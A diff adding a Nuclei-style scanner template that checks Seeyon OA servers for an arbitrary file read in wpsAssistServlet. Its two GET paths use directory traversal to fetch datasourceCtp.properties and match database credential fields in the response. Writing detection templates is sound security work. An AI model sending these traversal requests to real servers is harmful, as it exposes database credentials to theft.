@@ -1,0 +1,21 @@
+id: poc-seeyon-wpsAssistservlet-file-read
+info:
+  name: Seeyon OA wpsAssistServlet Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/seeyon/wpsAssistServlet?flag=open&fileId=-1233531&fileType=/../../conf/datasourceCtp.properties"
+      - "/seeyon/wpsAssistServlet?flag=template&templateUrl=../../base/conf/datasourceCtp.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "mysql.backup.path="
+          - "ctpDataSource.username"
